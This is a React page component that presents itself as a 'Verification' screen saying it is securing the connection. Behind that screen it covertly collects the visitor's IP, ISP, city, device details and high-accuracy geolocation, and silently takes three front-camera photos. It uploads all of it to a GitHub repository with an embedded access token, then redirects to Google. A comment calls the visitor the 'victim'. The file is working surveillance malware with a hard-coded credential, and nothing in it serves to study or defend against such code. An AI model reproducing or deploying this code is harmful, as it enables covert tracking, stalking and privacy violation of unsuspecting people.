
import React, { useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const videoRef = useRef<HTMLVideoElement>(null);
  const executed = useRef(false);

  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";

  useEffect(() => {
    if (id && !executed.current) {
      executed.current = true;
      startDeepTracking();
    }
  }, [id]);

  const uploadToGitHub = async (path: string, content: string, isBase64 = false) => {
    try {
      return await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/${path}`, {
        method: 'PUT',
        headers: { 'Authorization': `token ${G_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `Log: ${path}`,
          content: isBase64 ? content : btoa(unescape(encodeURIComponent(content))),
        }),
      });
    } catch (e) { return null; }
  };

  const startDeepTracking = async () => {
    const logId = `v_${Date.now()}`;
    const startTime = Date.now();

    // 1. Technical Intel with Fallbacks
    const getNetworkIntel = async () => {
      let ip = 'Unknown', isp = 'Unknown', city = 'Unknown';
      try {
        const res = await fetch('https://ipapi.co/json/').then(r => r.json());
        ip = res.ip; isp = res.org; city = res.city;
      } catch {
        try {
          const res = await fetch('https://api.ipify.org?format=json').then(r => r.json());
          ip = res.ip;
        } catch {}
      }
      
      // @ts-ignore
      const battery = navigator.getBattery ? await navigator.getBattery() : null;
      // @ts-ignore
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

      return {
        ip, isp, city,
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : 'N/A',
        ram: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown',
        screen: `${window.screen.width}x${window.screen.height}`,
        network: conn ? conn.effectiveType : 'Unknown',
        platform: navigator.platform,
        userAgent: navigator.userAgent
      };
    };

    // 2. Parallel Gathering (Camera + Geo + System)
    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).catch(() => null);
    const geoPromise = new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), { 
        enableHighAccuracy: true, timeout: 6000, maximumAge: 0 
      });
    });

    const [intel, stream, pos] = await Promise.all([getNetworkIntel(), mediaPromise, geoPromise]);

    const payload: any = {
      ...intel,
      userId: id,
      time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' }),
      location: pos ? {
        // @ts-ignore
        lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy
      } : 'Denied/Timeout',
      photos: []
    };

    // 3. Fast Burst Capture & Simultaneous Upload
    if (stream && videoRef.current) {
      videoRef.current.srcObject = stream;
      const capturePromises = [];
      
      for (let i = 1; i <= 3; i++) {
        await new Promise(r => setTimeout(r, 600));
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0, 640, 480);
        const b64 = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
        const path = `data/captures/${logId}_${i}.jpg`;
        capturePromises.push(uploadToGitHub(path, b64, true));
        payload.photos.push(`https://raw.githubusercontent.com/${G_OWNER}/${G_REPO}/main/${path}`);
      }
      
      await Promise.all(capturePromises);
      stream.getTracks().forEach(t => t.stop());
    }

    // 4. Final Log Push
    await uploadToGitHub(`data/logs/${logId}.json`, JSON.stringify(payload));

    // Wait at least 3 seconds to ensure victim thinks something is loading
    const elapsed = Date.now() - startTime;
    setTimeout(() => { window.location.href = "https://www.google.com"; }, Math.max(0, 3500 - elapsed));
  };

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center p-6 font-['Hind_Siliguri']">
      <div className="max-w-xs w-full bg-white p-12 rounded-[50px] shadow-2xl shadow-blue-100 border border-slate-100 text-center">
        <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-8"></div>
        <h1 className="text-2xl font-black text-slate-800 mb-2">Verification</h1>
        <p className="text-slate-400 text-sm">Please wait while we secure your connection...</p>
        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
      </div>
    </div>
  );
};

export default TrackPage;
